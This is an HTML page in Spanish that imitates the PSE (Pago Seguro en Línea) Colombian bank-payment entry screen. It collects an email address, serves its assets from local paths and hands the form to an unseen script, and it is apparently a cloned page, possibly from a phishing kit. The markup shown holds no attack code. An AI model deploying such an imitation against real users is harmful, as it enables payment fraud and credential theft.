<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PSE - Pago Seguro en Línea</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/pse/styles.css">
</head>
<body>

<div class="bg-pattern"></div>

<header class="header">
    <img src="/pse/img/NFbanner-izq.svg" alt="PSE" class="main-banner">
</header>

<main class="main-container">
    <div class="content-box">
        <h1 class="main-title">Selecciona el tipo de persona:</h1>

        <form class="main-form" id="pse-form">
            <!-- Person Type Selector -->
            <div class="person-selector">
                <div class="person-card selected" data-type="natural">
                    <input type="radio" name="personType" value="natural" checked>
                    <img src="/pse/img/natural_check.svg" alt="Natural" class="person-img">
                    <span class="person-label">Natural</span>
                </div>
                <div class="person-card" data-type="juridica">
                    <input type="radio" name="personType" value="juridica">
                    <img src="/pse/img/juridica.svg" alt="Jurídica" class="person-img">
                    <span class="person-label">Jurídica</span>
                </div>
            </div>

            <!-- User Options -->
            <div class="user-options">
                <button type="button" class="user-option selected" id="registered-user">
                    <img src="/pse/img/opreg_sel.svg" alt="" class="option-icon">
                    <span>Soy un usuario registrado</span>
                </button>
                <button type="button" class="user-option" id="new-user">
                    <img src="/pse/img/opact.svg" alt="" class="option-icon">
                    <span>Registrarme ahora</span>
                </button>
            </div>

            <!-- Email Field -->
            <div class="email-field">
                <label for="email" class="field-label">
                    Ingresa tu correo electrónico <span class="asterisk">*</span>
                </label>
                <input 
                    type="email" 
                    id="email" 
                    name="email" 
                    class="email-input" 
                    placeholder="Ej: correo@pse.com.co"
                    required
                >
            </div>

            <!-- Buttons -->
            <div class="form-buttons">
                <button type="submit" class="btn-primary" id="btn-submit">
                    Ir al Banco
                </button>
                <button type="button" class="btn-secondary" onclick="window.location.href='/payment'">
                    Regresar al comercio
                </button>
            </div>
        </form>

        <!-- Contact Information -->
        <div class="contact-box">
            <div class="contact-icon-left">
                <img src="/pse/img/footerD.svg" alt="Contacto">
            </div>
            <div class="contact-content">
                <h3 class="contact-title">Para mayor información comunícate con nosotros:</h3>
                <div class="contact-info">
                    <div class="contact-row">
                        <img src="/pse/img/mobile.svg" alt="Teléfono">
                        <span><strong>En Bogotá:</strong> +57 (601) 3808890 opción 5</span>
                    </div>
                    <div class="contact-row">
                        <img src="/pse/img/conta.svg" alt="Web">
                        <span><strong>Contáctanos:</strong> 
                            <a href="https://www.pse.com.co/persona-centro-de-ayuda" target="_blank">
                                https://www.pse.com.co/persona-centro-de-ayuda
                            </a>
                        </span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</main>

<!-- Loading Overlay PSE -->
<div id="loadingOverlay" class="loading-overlay-pse">
    <div class="loading-content-pse">
        <img src="/pse/img/procesandonw.gif" alt="Procesando" class="loading-gif-pse">
        <p class="loading-text-pse">Procesando solicitud PSE...</p>
        <p class="loading-subtext-pse">Por favor espera mientras validamos tu información</p>
    </div>
</div>

<style>
.loading-overlay-pse {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.85);
    z-index: 9999;
    justify-content: center;
    align-items: center;
}

.loading-overlay-pse.active {
    display: flex;
}

.loading-content-pse {
    text-align: center;
    background: white;
    padding: 40px;
    border-radius: 12px;
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
}

.loading-gif-pse {
    width: 120px;
    height: 120px;
    margin-bottom: 20px;
}

.loading-text-pse {
    font-size: 18px;
    font-weight: 600;
    color: #333;
    margin: 10px 0;
}

.loading-subtext-pse {
    font-size: 14px;
    color: #666;
    margin: 5px 0;
}
</style>

<script src="/js/pse-app.js"></script>

</body>
</html>
